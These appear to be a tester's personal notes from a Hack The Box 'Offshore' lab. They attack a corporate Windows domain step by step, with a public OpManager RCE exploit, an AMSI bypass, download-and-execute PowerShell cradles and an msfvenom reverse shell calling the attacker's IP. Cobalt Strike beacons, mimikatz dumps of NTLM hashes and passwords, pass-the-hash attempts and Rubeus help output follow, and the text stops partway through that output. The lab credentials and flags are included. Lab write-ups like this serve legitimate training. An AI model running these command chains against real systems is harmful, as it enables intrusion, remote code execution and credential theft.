Utilize Burp Proxy and 127.0.0.1 Port 1080 for proxychains config
In burp ensure that the socks proxy port is set.
![[Pasted image 20230831104918.png]]
Gobuster did not yield any results

```
Utilized Gobuster, did not yield anything
```bash
gobuster dir --proxy socks5://127.0.0.1:108- -u http://172.16.1.30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Utilized tcpdump on 10.10.110.123 to collect traffic and put into a file named pcap.pcap
- Let the tcpdump run for 30 minutes 
```bash
root@NIX01:~# tcpdump -w pcap.pcap
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
^C4715 packets captured
```
On kali machine used scp to pull the pcap.pcap over from the 10.10.110.123 machine
```bash
[rootðŸ’€~/bugs_offshore/10.10.110.123] [10.10.14.39] [2023-08-31 12:19:14] 
 â””â”€â•¼ # scp -i root_rsa root@10.10.110.123:/root/pcap.pcap /root/bugs_offshore/pcap.pcap
pcap.pcap                                                                                      100% 3913KB   4.8MB/s   00:00  
```

![[Pasted image 20230831124225.png]]
opened pcap.pcap with wireshark and filtered by http to catch the credentials
![[Pasted image 20230831124501.png]]
```bash
Frame 3802: 133 bytes on wire (1064 bits), 133 bytes captured (1064 bits)
Ethernet II, Src: VMware_b9:6b:41 (00:50:56:b9:6b:41), Dst: VMware_b9:a9:2d (00:50:56:b9:a9:2d)
Internet Protocol Version 4, Src: 172.16.1.30, Dst: 172.16.1.23
Transmission Control Protocol, Src Port: 61103, Dst Port: 80, Seq: 268, Ack: 26, Len: 79
[2 Reassembled TCP Segments (346 bytes): #3799(267), #3802(79)]
Hypertext Transfer Protocol
HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: "username" = "admin"
        Key: username
        Value: admin
    Form item: "flag" = "OFFSHORE{l0v3_cl3artext_pr0toc0l$}"
        Key: flag
        Value: OFFSHORE{l0v3_cl3artext_pr0toc0l$}
    Form item: "password" = "Zaq12wsx!"
```

Nothing to see here flag:
`OFFSHORE{l0v3_cl3artext_pr0toc0l$}`

On as admin
![[Pasted image 20230831124951.png]]
Found Authenticated Code Execution
https://www.exploit-db.com/exploits/47255
setup a python3 server on my kali machine & attempted to reach out to it to test if I could hit the server
```bash
proxychains python3 47255.py -u admin -t http://172.16.1.30 -p 'Zaq12wsx!' -c "powershell iwr http://10.10.14.39:8000"
```
![[Pasted image 20230831141734.png]]
amsi""utils
amsiutils
amsi.fails
Made amsi.txt file to bypass amsi.
Pulled over file 
```powershell
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Documents/Offshore_Pro_Labs/172.16.1.30_MS01]
â””â”€# proxychains python3 47255.py -u admin -t http://172.16.1.30 -p 'Zaq12wsx!' -c "powershell iwr http://10.10.14.39:8000/amsi.txt"
```
Calling file
```powershell
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Documents/Offshore_Pro_Labs/172.16.1.30_MS01]
â””â”€# proxychains python3 47255.py -u admin -t http://172.16.1.30 -p 'Zaq12wsx!' -c "IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.14.39:8000/amsi.txt'))"
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.1.30:80  ...  OK
[+] Successfully created Workflow
[!] Executing Code . . .
[+] Code appears to have run successfully!
[!] Cleaning up . . .
[+] Exploit complete!

```
Making a reverse shell to try to get RCE
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.39 lport=4444 -f exe -o payload.exe
```
Was able to transfer over payload.exe
```powershell
proxychains python3 47255.py -u admin -t http://172.16.1.30 -p 'Zaq12wsx!' -c "powershell iwr http://10.10.14.39:8000/payload.exe"``
```

### What Was actually used
FoxyProxy Configs that enables utilizing proxychains 
![[Pasted image 20231005094240.png]]
![[Pasted image 20231005094350.png]]
![[Pasted image 20231005094424.png]]
```
`Instead of Proxychains 

[rootðŸ’€~/offshore/nix01] [10.10.14.39] [2023-10-06 11:19:53] 
 â””â”€â•¼ # ssh 10.10.110.123 -i root_rsa -D 1080
```

Browse to this location `http:\\172.16.1.30:80\`
![[Pasted image 20231005114059.png]]
CobaltStrike ways to pull flag if already have a cobalt session.
```shell
beacon> shell findstr /s OFFSHORE( *
```

```powershell
Powershell flag hunting
gci  -PATH C:\ -Recurse - ErrorAction SilentlyCOntinue | Select-String -Pattern "OFFSHORE{" | Select-Object -First 1
```


---
Going to setup Cobalt strike server and try to catch a beacon using exploit above

```powershell
proxychains python3 47255.py -u admin -t http://172.16.1.30 -p 'Zaq12wsx!' -c "powershell iwr http://10.10.14.39:8000/payload.exe"``
```

GUI home dashboard overview FLAG

We can do better than this:

OFFSHORE{sm3lls_so_g00d}


cmd /c powershell -c iwr -uri http:/10.10.14.39:8000/http_x64.exe

cmd /c powershell -c iwr -uri http:/10.10.14.39:8000




To set up the workflow in OPMANAGER

![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231005134110.png]]
Setup Python3 HTTP server to check if i'm able to touch my kali machine, I was!
![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231005134218.png]]
To execute the workflow
![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231005134456.png]]
Workflow command used.
```powershell
# cmd /c executes and deleted the file.
cmd /c powershell -c iwr -uri http://10.10.14.39:8000/config.xml -outfile C:\Temp\config.xml

```
![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231005134626.png]]
To Start Cobalt Strike Server - make sure to have the 10.10.14.39 ip hosting 
![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231005135234.png]]
Testing Powershell - bitsadmin is what was used previously
![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231005140207.png]]
Listener `/a`:
![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231005140955.png]]
Command that gets spit out: 
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.14.39:80/a'))"

This one worked for me had to execute twice though.
On as System
![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231005141231.png]]
`cd C:\\Users\Administrator\Desktop` and `download flag.txt`
![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231005141913.png]]
Sync files 
![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231005142103.png]]
Saved in.

```powershell
[rootðŸ’€~/offshore/ms01] [10.10.14.39] [2023-10-05 14:40:12] 
 â””â”€â•¼ # ls
47255.py  all_powerful_all_knowing_flag.txt
```



Domain Recon

```powershell
powershell-import ~/offshore/ms01/powerview.ps1
```

172.16.1.0/24  Network
```powershell
[10/05 15:13:52] beacon> portscan 172.16.1.1-172.16.1.254 1-1024,5000-6000 arp 1024
[10/06 11:37:58] [*] Tasked beacon to scan ports 1-1024,5000-6000 on 172.16.1.1-172.16.1.254
[10/06 11:38:01] [+] host called home, sent: 93797 bytes
[10/06 11:38:07] [+] received output:
(ARP) Target '172.16.1.30' is alive. 00-50-56-B9-BC-AB
(ARP) Target '172.16.1.26' is alive. 00-50-56-B9-C0-A3
(ARP) Target '172.16.1.24' is alive. 00-50-56-B9-02-5E
(ARP) Target '172.16.1.23' is alive. 00-50-56-B9-8B-1C
(ARP) Target '172.16.1.22' is alive. 00-50-56-B9-A3-9E
(ARP) Target '172.16.1.15' is alive. 00-50-56-B9-6D-E1
(ARP) Target '172.16.1.1' is alive. 00-50-56-B9-52-2B
(ARP) Target '172.16.1.5' is alive. 00-50-56-B9-28-BC
(ARP) Target '172.16.1.36' is alive. 00-50-56-B9-44-80

[10/06 11:38:13] [+] received output:
(ARP) Target '172.16.1.101' is alive. 00-50-56-B9-E0-4C

[10/06 11:38:23] [+] received output:
(ARP) Target '172.16.1.200' is alive. 00-50-56-B9-BE-C3
(ARP) Target '172.16.1.201' is alive. 00-50-56-B9-5F-A3

[10/06 11:38:28] [+] received output:
(ARP) Target '172.16.1.220' is alive. 00-50-56-B9-33-37

[10/06 11:38:33] [+] received output:
172.16.1.220:5985

[10/06 11:38:39] [+] received output:
172.16.1.220:636
172.16.1.220:593
172.16.1.220:464
172.16.1.220:389
172.16.1.220:139
172.16.1.220:135
172.16.1.220:88
172.16.1.220:53
172.16.1.201:5985
172.16.1.201:5900
172.16.1.201:5800

[10/06 11:38:44] [+] received output:
172.16.1.201:5040

[10/06 11:38:49] [+] received output:
172.16.1.201:139
172.16.1.201:135
172.16.1.201:80
172.16.1.200:5985

[10/06 11:38:54] [+] received output:
172.16.1.201:21 (220 Microsoft FTP Service)
172.16.1.200:636
172.16.1.200:593

[10/06 11:39:00] [+] received output:
172.16.1.200:464
172.16.1.200:389
172.16.1.200:139
172.16.1.200:135
172.16.1.200:88
172.16.1.200:53
172.16.1.101:5985

[10/06 11:39:21] [+] received output:
172.16.1.101:139
172.16.1.101:135

[10/06 11:39:26] [+] received output:
172.16.1.36:5985

[10/06 11:39:31] [+] received output:
172.16.1.36:5040

[10/06 11:39:36] [+] received output:
172.16.1.36:139
172.16.1.36:135

[10/06 11:39:41] [+] received output:
172.16.1.30:5985

[10/06 11:39:47] [+] received output:
172.16.1.30:139
172.16.1.30:135
172.16.1.30:80
172.16.1.30:22 (SSH-2.0-Network ConfigManager SCP Server)

[10/06 11:39:52] [+] received output:
172.16.1.26:5985

[10/06 11:40:02] [+] received output:
172.16.1.26:139
172.16.1.26:135
172.16.1.24:5985

[10/06 11:40:23] [+] received output:
172.16.1.24:139
172.16.1.24:135
172.16.1.24:80

[10/06 11:40:28] [+] received output:
172.16.1.23:80

[10/06 11:40:39] [+] received output:
172.16.1.23:22 (SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10)

[10/06 11:41:26] [+] received output:
172.16.1.15:5985

[10/06 11:41:36] [+] received output:
172.16.1.15:139
172.16.1.15:135
172.16.1.5:5985

[10/06 11:41:46] [+] received output:
172.16.1.5:636
172.16.1.5:593

[10/06 11:41:51] [+] received output:
172.16.1.5:464
172.16.1.5:389

[10/06 11:41:57] [+] received output:
172.16.1.5:139
172.16.1.5:135
172.16.1.5:88
172.16.1.5:53

[10/06 11:42:59] [+] received output:
172.16.1.5:445 (platform: 500 version: 10.0 name: DC01 domain: CORP)
172.16.1.15:445 (platform: 500 version: 10.0 name: SQL01 domain: CORP)
172.16.1.24:445 (platform: 500 version: 10.0 name: WEB-WIN01 domain: CORP)
172.16.1.26:445 (platform: 500 version: 10.0 name: FS01 domain: CORP)
172.16.1.30:445 (platform: 500 version: 10.0 name: MS01 domain: CORP)
172.16.1.36:445 (platform: 500 version: 10.0 name: WSADM domain: CORP)

[10/06 11:43:04] [+] received output:
172.16.1.101:445 (platform: 500 version: 6.1 name: WS02 domain: CORP)
172.16.1.200:445
172.16.1.201:445
172.16.1.220:445
Scanner module is complete
```

Try Bloodhound next.


Admin NTLM from MS01 Mimikatz:
```powershell
[10/06 11:24:55] beacon> mimikatz token::elevate ; lsadump::sam
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7facdc498ed1680c4fd1448319a8c04f
```
All powerview commands getting errors.
![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231006113559.png]]
New scan above shows 5985 is open on alot of boxes, going to try to winrm jump to them
- setup SMB listener to jump with
![[Penetration Testing v2/htb_Everything/htb_pro_Labs/offshore/2. 172.16.1.30 - CORP-MS01/screenshots/Pasted image 20231006115923.png]]
jump winrm64 172.16.1.36 smb // didnt work

jump psexec64 172.16.1.36 smb  // nope didnt work

WSADM.corp.local

jump psexec64 WSADM.corp.local smb  // nope didnt work
jump winrm63 WSADM.corp.local smb 


```powershell
[10/06 12:14:35] beacon> mimikatz !sekurlsa::logonpasswords
[10/06 12:14:37] [*] Tasked beacon to run mimikatz's !sekurlsa::logonpasswords command
[10/06 12:14:38] [+] host called home, sent: 813691 bytes
[10/06 12:14:40] [+] received output:

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : CORP
	 * NTLM     : b0008678126a9a7143961c96161725a4
	 * SHA1     : 570e49936ec2e700501645c102f53b64f66be28d
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 66631 (00000000:00010447)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : CORP
	 * NTLM     : b0008678126a9a7143961c96161725a4
	 * SHA1     : 570e49936ec2e700501645c102f53b64f66be28d
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : corp.local
	 * Password : 4G27%CXs#vdBm&ZyC@OA4@[H3%F;fksT[tUqML/4AYDJ^(sxXUqQWdT"!WdPj$HC(Pj1d0r75fV<FhyE$u3lAT7@CGiiP-si[D[jzHxtsi40iw ;]H6jh)Bm
	ssp :	
	credman :	

Authentication Id : 0 ; 66237 (00000000:000102bd)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : CORP
	 * NTLM     : b0008678126a9a7143961c96161725a4
	 * SHA1     : 570e49936ec2e700501645c102f53b64f66be28d
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : corp.local
	 * Password : 4G27%CXs#vdBm&ZyC@OA4@[H3%F;fksT[tUqML/4AYDJ^(sxXUqQWdT"!WdPj$HC(Pj1d0r75fV<FhyE$u3lAT7@CGiiP-si[D[jzHxtsi40iw ;]H6jh)Bm
	ssp :	
	credman :	

Authentication Id : 0 ; 35813 (00000000:00008be5)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : CORP
	 * NTLM     : b0008678126a9a7143961c96161725a4
	 * SHA1     : 570e49936ec2e700501645c102f53b64f66be28d
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
```

```powershell
[10/06 12:17:06] beacon> mimikatz !sekurlsa::ekeys
[10/06 12:17:08] [*] Tasked beacon to run mimikatz's !sekurlsa::ekeys command
[10/06 12:17:10] [+] host called home, sent: 813682 bytes
[10/06 12:17:12] [+] received output:

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-18

	 * Username : ms01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	 * Key List :
	   aes256_hmac       ca5535b6c115d08ac507ad9b56229f6874a515f922ca7ae7ae9c26ee61ccc0f7
	   rc4_hmac_nt       b0008678126a9a7143961c96161725a4
	   rc4_hmac_old      b0008678126a9a7143961c96161725a4
	   rc4_md4           b0008678126a9a7143961c96161725a4
	   rc4_hmac_nt_exp   b0008678126a9a7143961c96161725a4
	   rc4_hmac_old_exp  b0008678126a9a7143961c96161725a4

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-20

	 * Username : ms01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	 * Key List :
	   aes256_hmac       ca5535b6c115d08ac507ad9b56229f6874a515f922ca7ae7ae9c26ee61ccc0f7
	   rc4_hmac_nt       b0008678126a9a7143961c96161725a4
	   rc4_hmac_old      b0008678126a9a7143961c96161725a4
	   rc4_md4           b0008678126a9a7143961c96161725a4
	   rc4_hmac_nt_exp   b0008678126a9a7143961c96161725a4
	   rc4_hmac_old_exp  b0008678126a9a7143961c96161725a4

Authentication Id : 0 ; 66631 (00000000:00010447)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-90-0-1

	 * Username : MS01$
	 * Domain   : corp.local
	 * Password : 4G27%CXs#vdBm&ZyC@OA4@[H3%F;fksT[tUqML/4AYDJ^(sxXUqQWdT"!WdPj$HC(Pj1d0r75fV<FhyE$u3lAT7@CGiiP-si[D[jzHxtsi40iw ;]H6jh)Bm
	 * Key List :
	   aes256_hmac       2144003ad888aea454328baedf99d3aff8b4b340c74159390ec7599c568ad2b8
	   aes128_hmac       187ef7ac1823f7bcd76940ea16521782
	   rc4_hmac_nt       b0008678126a9a7143961c96161725a4
	   rc4_hmac_old      b0008678126a9a7143961c96161725a4
	   rc4_md4           b0008678126a9a7143961c96161725a4
	   rc4_hmac_nt_exp   b0008678126a9a7143961c96161725a4
	   rc4_hmac_old_exp  b0008678126a9a7143961c96161725a4

Authentication Id : 0 ; 66237 (00000000:000102bd)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-90-0-1

	 * Username : MS01$
	 * Domain   : corp.local
	 * Password : 4G27%CXs#vdBm&ZyC@OA4@[H3%F;fksT[tUqML/4AYDJ^(sxXUqQWdT"!WdPj$HC(Pj1d0r75fV<FhyE$u3lAT7@CGiiP-si[D[jzHxtsi40iw ;]H6jh)Bm
	 * Key List :
	   aes256_hmac       2144003ad888aea454328baedf99d3aff8b4b340c74159390ec7599c568ad2b8
	   aes128_hmac       187ef7ac1823f7bcd76940ea16521782
	   rc4_hmac_nt       b0008678126a9a7143961c96161725a4
	   rc4_hmac_old      b0008678126a9a7143961c96161725a4
	   rc4_md4           b0008678126a9a7143961c96161725a4
	   rc4_hmac_nt_exp   b0008678126a9a7143961c96161725a4
	   rc4_hmac_old_exp  b0008678126a9a7143961c96161725a4

```
Going to try to Pass the hash to administrator
```powershell
pth CORP\Administrator 7facdc498ed1680c4fd1448319a8c04f
```
/usr/share/poshc2/resources/modules/Seatbelt.exe

execute-assembly /usr/share/poshc2/resources/modules/Seatbelt.exe -group=system





Tried to evil-winrm wasnt able to.
```powershell
[rootðŸ’€~] [10.10.14.39] [2023-10-06 14:33:09] 
 â””â”€â•¼ # proxychains evil-winrm -i 172.16.1.30 -u CORP\Administrator -H 7facdc498ed1680c4fd1448319a8c04f
 Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1

```

```powershell
[rootðŸ’€~] [10.10.14.39] [2023-10-06 14:33:09] 
proxychains evil-winrm -i 172.16.1.30 -u Administrator -H 7facdc498ed1680c4fd1448319a8c04f
```

```powershell
[rootðŸ’€~] [10.10.14.39] [2023-10-06 14:37:11] 
 â””â”€â•¼ # proxychains xfreerdp /u:Administrator /d:CORP /pth:7facdc498ed1680c4fd1448319a8c04f /cert:ignore /v:172.16.1.30
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[14:39:18:171] [14751:14819] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[14:39:18:172] [14751:14819] [WARN][com.freerdp.crypto] - CN = MS01.corp.local
[14:39:18:174] [14751:14819] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[14:39:18:174] [14751:14819] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[14:39:18:174] [14751:14819] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[14:39:18:174] [14751:14819] [ERROR][com.freerdp.crypto] - The hostname used for this connection (172.16.1.30:3389) 
[14:39:18:174] [14751:14819] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[14:39:18:174] [14751:14819] [ERROR][com.freerdp.crypto] - Common Name (CN):
[14:39:18:174] [14751:14819] [ERROR][com.freerdp.crypto] - 	MS01.corp.local
[14:39:18:174] [14751:14819] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 172.16.1.30:3389 (RDP-Server):
	Common Name: MS01.corp.local
	Subject:     CN = MS01.corp.local
	Issuer:      CN = MS01.corp.local
	Thumbprint:  85:3f:de:58:4e:c3:c1:7f:75:4b:8c:12:0b:9e:6d:25:dc:a3:d0:3b:32:b7:6d:d3:97:61:1d:34:e7:d2:44:13
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[14:39:21:760] [14751:14819] [WARN][com.freerdp.core.nla] - SPNEGO received NTSTATUS: STATUS_LOGON_FAILURE [0xC000006D] from server
[14:39:21:760] [14751:14819] [ERROR][com.freerdp.core] - nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE [0x00020014]
[14:39:21:760] [14751:14819] [ERROR][com.freerdp.core.rdp] - rdp_recv_callback: CONNECTION_STATE_NLA - nla_recv_pdu() fail
[14:39:21:760] [14751:14819] [ERROR][com.freerdp.core.transport] - transport_check_fds: transport->ReceiveCallback() - -1
```
Going to try to get to WSADM `172.16.1.36`
```powershell
[10/06 14:53:16] beacon> portscan 172.16.1.36 1-1024,5000-6000 arp 1024
[10/06 14:53:16] [*] Tasked beacon to scan ports 1-1024,5000-6000 on 172.16.1.36
[10/06 14:53:17] [+] host called home, sent: 93797 bytes
[10/06 14:53:19] [+] received output:
(ARP) Target '172.16.1.36' is alive. 00-50-56-B9-44-80
172.16.1.36:5985

[10/06 14:53:24] [+] received output:
172.16.1.36:5040

[10/06 14:53:33] [+] received output:
172.16.1.36:139
172.16.1.36:135

[10/06 14:53:37] [+] received output:
172.16.1.36:445
Scanner module is complete
```
execute-assembly /usr/share/poshc2/resources/modules/Rubeus.exe
```powershell
[10/06 15:08:08] beacon> execute-assembly /usr/share/poshc2/resources/modules/Rubeus.exe
[10/06 15:08:23] [*] Tasked beacon to run .NET program: Rubeus.exe
[10/06 15:08:23] [+] host called home, sent: 319531 bytes
[10/06 15:08:25] [+] received output:


   ______        _                      

  (_____ \      | |                     

   _____) )_   _| |__  _____ _   _  ___ 

  |  __  /| | | |  _ \| ___ | | | |/___)

  | |  \ \| |_| | |_) ) ____| |_| |___ |

  |_|   |_|____/|____/|_____)____/(___/



  v1.5.0 





 Ticket requests and renewals:



    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:

        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap]



    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:

        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]



    Retrieve a service ticket for one or more SPNs, optionally saving or applying the ticket:

        Rubeus.exe asktgs </ticket:BASE64 | /ticket:FILE.KIRBI> </service:SPN1,SPN2,...> [/enctype:DES|RC4|AES128|AES256] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]



    Renew a TGT, optionally applying the ticket, saving it, or auto-renewing the ticket up to its renew-till limit:

        Rubeus.exe renew </ticket:BASE64 | /ticket:FILE.KIRBI> [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/autorenew] [/nowrap]



    Perform a Kerberos-based password bruteforcing attack:

        Rubeus.exe brute </password:PASSWORD | /passwords:PASSWORDS_FILE> [/user:USER | /users:USERS_FILE] [/domain:DOMAIN] [/creduser:DOMAIN\\USER & /credpassword:PASSWORD] [/ou:ORGANIZATION_UNIT] [/dc:DOMAIN_CONTROLLER] [/outfile:RESULT_PASSWORD_FILE] [/noticket] [/verbose] [/nowrap]





 Constrained delegation abuse:



    Perform S4U constrained delegation abuse:

        Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]

        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap]



    Perform S4U constrained delegation abuse across domains:

        Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap]





 Ticket management:



    Submit a TGT, optionally targeting a specific LUID (if elevated):

        Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI> [/luid:LOGINID]



    Purge tickets from the current logon session, optionally targeting a specific LUID (if elevated):

        Rubeus.exe purge [/luid:LOGINID]



    Parse and describe a ticket (service ticket or TGT):

        Rubeus.exe describe </ticket:BASE64 | /ticket:FILE.KIRBI>





 Ticket extraction and harvesting:



    Triage all current tickets (if elevated, list for all users), optionally targeting a specific LUID, username, or service:

        Rubeus.exe triage [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]



    List all current tickets in detail (if elevated, list for all users), optionally targeting a specific LUID:

        Rubeus.exe klist [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM]



    Dump all current ticket data (if elevated, dump for all users), optionally targeting a specific service/LUID:

        Rubeus.exe dump [/luid:LOGINID] [/user:USER] [/service:krbtgt] [/server:BLAH.DOMAIN.COM] [/nowrap]



    Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:

        Rubeus.exe tgtdeleg [/target:SPN]



    Monitor every /interval SECONDS (default 60) for new TGTs:

        Rubeus.exe monitor [/interval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME]



    Monitor every /monitorinterval SECONDS (default 60) for new TGTs, auto-renew TGTs, and display the working cache every /displayinterval SECONDS (default 1200):

        Rubeus.exe harvest [/monitorinterval:SECONDS] [/displayinterval:SECONDS] [/targetuser:USER] [/nowrap] [/registry:SOFTWARENAME]





 Roasting:



    Perform Kerberoasting:

        Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]



    Perform Kerberoasting, outputting hashes to a file:

        Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]



    Perform Kerberoasting, outputting hashes in the file output format, but to the console:

